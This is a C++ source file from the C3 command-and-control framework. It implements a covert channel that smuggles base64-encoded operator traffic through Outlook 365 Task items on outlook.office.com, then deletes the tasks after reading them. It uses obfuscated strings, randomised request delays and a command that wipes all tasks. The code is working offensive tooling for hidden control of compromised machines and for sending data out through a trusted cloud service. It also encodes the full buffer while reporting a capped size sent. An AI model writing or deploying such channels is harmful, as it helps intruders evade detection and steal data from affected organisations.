#include "StdAfx.h"
#include "Outlook365RestTask.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/ScopeGuard.h"
#include "Common/json/json.hpp"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"

// Namespaces
using json = nlohmann::json;
using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::Crypto::String FSecure::C3::Interfaces::Channels::Outlook365RestTask::ItemEndpont = OBF("https://outlook.office.com/api/v2.0/me/tasks/");
FSecure::Crypto::String FSecure::C3::Interfaces::Channels::Outlook365RestTask::ListEndpoint = OBF("https://outlook.office.com/api/v2.0/me/tasks");
FSecure::Crypto::String FSecure::C3::Interfaces::Channels::Outlook365RestTask::TokenEndpoit = OBF("https://login.windows.net/organizations/oauth2/v2.0/token/");
FSecure::Crypto::String FSecure::C3::Interfaces::Channels::Outlook365RestTask::Scope = OBF("https://outlook.office365.com/.default");

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Outlook365RestTask::OnSendToChannel(ByteView data)
{
	RateLimitDelay(m_MinUpdateDelay, m_MaxUpdateDelay);

	try
	{
		// Construct the HTTP request
		auto webClient = HttpClient{ Convert<Utf16>(ItemEndpont.Decrypt()), m_ProxyConfig };
		auto request = CreateAuthRequest(Method::POST);

		auto chunkSize = std::min<size_t>(data.size(), 3 * 1024 * 1024); // Send max 4 MB. base64 will expand data by 4/3.
		auto fileData = json();
		fileData[OBF("Subject")] = m_OutboundDirectionName;
		fileData[OBF("Body")][OBF("Content")] = cppcodec::base64_rfc4648::encode(&data.front(), data.size());
		fileData[OBF("Body")][OBF("ContentType")] = OBF("Text");

		auto body = fileData.dump();
		request.SetData(ContentType::ApplicationJson, { body.begin(), body.end() });
		EvaluateResponse(webClient.Request(request));

		return chunkSize;
	}
	catch (std::exception & exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnSend(): ") + exception.what(), LogMessage::Severity::Error });
		return 0u;
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Outlook365RestTask::OnReceiveFromChannel()
{
	RateLimitDelay(m_MinUpdateDelay, m_MaxUpdateDelay);

	auto packets = std::vector<ByteVector>{};
	try
	{
		auto fileList = ListData(OBF("?top=1000&filter=startswith(Subject,'") + m_InboundDirectionName + OBF("')&orderby=CreatedDateTime"));

		for (auto& element : fileList.at(OBF("value")))
			packets.emplace_back(cppcodec::base64_rfc4648::decode(element.at(OBF("Body")).at(OBF("Content")).get<std::string>()));

		for (auto& element : fileList.at(OBF("value")))
			RemoveFile(element.at(OBF("Id")));
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnReceive(): ") + exception.what(), LogMessage::Severity::Warning });
	}

	return packets;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Outlook365RestTask::OnRunCommand(ByteView command)
{
	auto commandCopy = command; // Each read moves ByteView. CommandCoppy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		try
		{
			RemoveAllFiles();
		}
		catch (std::exception const& e)
		{
			Log({ OBF_SEC("Caught a std::exception when running RemoveAllFiles(): ") + e.what(), LogMessage::Severity::Error });
		}
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}
